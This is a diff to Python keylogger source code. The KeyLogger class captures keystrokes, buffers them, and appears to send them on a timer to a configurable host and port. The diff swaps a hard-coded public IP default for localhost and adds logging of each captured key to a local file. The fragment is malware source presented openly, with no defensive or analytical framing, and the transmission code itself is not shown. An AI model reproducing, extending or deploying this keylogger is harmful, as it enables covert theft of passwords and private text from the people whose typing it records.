@@ -5,10 +5,11 @@ import threading
 
 
 class KeyLogger:
-    def __init__(self, host="109.74.200.23", port=8080, interval=10):
+    def __init__(self, host="127.0.0.1", port=8080, interval=10, log_file=None):
         self.host = host
         self.port = port
         self.interval = interval
+        self.log_file = log_file
         self.text = ""
         self.stop_event = threading.Event()
         self.timer = None
@@ -33,13 +34,25 @@ class KeyLogger:
         self.timer.daemon = True
         self.timer.start()
 
+    def _write_log(self, text):
+        if not self.log_file:
+            return
+        try:
+            with open(self.log_file, "a", encoding="utf-8") as f:
+                f.write(text)
+        except Exception:
+            pass
+
     def _on_press(self, key):
         if key == keyboard.Key.enter:
             self.text += "\n"
+            self._write_log("\n")
         elif key == keyboard.Key.tab:
             self.text += "\t"
+            self._write_log("\t")
         elif key == keyboard.Key.space:
             self.text += " "
+            self._write_log(" ")
         elif key in {
             keyboard.Key.shift,
             keyboard.Key.shift_l,
@@ -56,10 +69,12 @@ class KeyLogger:
             return
         elif key == keyboard.Key.backspace:
             self.text = self.text[:-1] if self.text else ""
+            self._write_log("\b")
         elif key == keyboard.Key.esc:
             return False
         else:
             self.text += str(key).strip("'")
+            self._write_log(str(key).strip("'"))
 
     def start(self):
         self.stop_event.clear()
